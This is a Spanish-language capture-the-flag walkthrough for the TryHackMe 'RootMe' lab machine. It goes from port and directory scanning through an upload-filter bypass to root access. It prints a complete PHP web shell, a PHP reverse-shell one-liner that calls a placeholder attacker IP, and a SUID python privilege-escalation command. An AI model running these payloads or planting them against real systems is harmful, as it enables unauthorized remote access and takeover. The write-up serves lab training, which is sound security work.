# Maquina RootMe - Linux - Web Uploads - Easy
![Image](https://github.com/user-attachments/assets/7cd964b0-75f6-49cf-864d-592b69ca9287)

# Escaneo con NMAP
![Image](https://github.com/user-attachments/assets/e310e554-7e5b-4647-a355-3b08d859f31d)
#### Realizamos scaneo completo con las siguientes flags: 
#### -sS: Scaneo Silencioso.
#### -Pn: No ping.
#### -sV: Muestra la versión del servicio en el puerto que se use.
#### --min-rate: Setea el envío minimo de paquetes en este caso 5000.
#### -T: Le seteamos la velocidad, podemos escoger del 1 al 5. En este caso 4.
#### -p-: Scanea todos los puertos en total 65535
#### --open: Muestra solo puertos abiertos
### Como resultado nos da dos puertos el 22 (SSH) y 80 (HTTP) definidos por default.

# Gobuster scan
![Image](https://github.com/user-attachments/assets/20248aff-8a55-4839-afb4-cda07ed5165f)
### Indicaciones: 
Como detectamos anteriormente que estaba abierto el puerto 80, nos indica que hay una
pagina web abierta, por lo que procedemos a tirar un gobuster y nos da directorios ocultos
**como el /panel y /uploads.** y indagando un poco el /panel sirve para subir archivos pero **OJO
no permite extensiones .php, por lo que subimos un .phtml** y nos desplegamos una Web Shell para luego irnos y desplegar una reverse shell.

### Código: 
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
```
# Subida exitosa! (Usando .phtml)
![Image](https://github.com/user-attachments/assets/01e0ec90-f4d6-4e37-9721-aa37ca80da82)


# Web Shell + Netcat
![Image](https://github.com/user-attachments/assets/2a17b2c6-dcec-4354-8a73-55a8f8bbc251)

Desplegamos una reverse shell hacia nuestro puerto de escucha (4444)
### Código: 
```
php -r '$sock=fsockopen("REEMPLAZA_IP",4444);exec("sh <&3 >&3 2>&3");'
```


# Busqueda por SUID
![Image](https://github.com/user-attachments/assets/44d8d7ae-8ccf-409b-85e6-da508ae3cd97)

Una vez dentro, he estado revisando por permisos de sudo pero me pide contraseña para ejecutarlo
asi que lo omito y busco buscar por SUID con **"find / -perm u=s -type f 2>/dev/null"**
Y encuentro algo muy interesante, el python esta mal configurado
contiene permisos de SUID por lo que nos subimos los privilegios con:
```
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

# Escalada
![Image](https://github.com/user-attachments/assets/8589d584-4097-446f-b112-05be9d4b3324)

Obtenemos el acceso a root y empezamos a filtrar la flag del user que nos pide THM

# User flag
![Image](https://github.com/user-attachments/assets/30da5147-b514-45ae-9194-2dbe413298aa)

Para encontrar esta flag usamos el siguiente cmd:
```
find / -name "user.txt" 2>/dev/null
```


# Final
![Image](https://github.com/user-attachments/assets/5a6fc5f3-1f0a-40fa-812e-ab816dcedee5)

Y finalmente buscamos en el directorio de /root la flag final y la encontramos facilmente, como se muestra.
Esto ha sido todo, un poco breve pero directo al grano. Como a mi me gusta. 

"Hack to survive" - Mkadd.
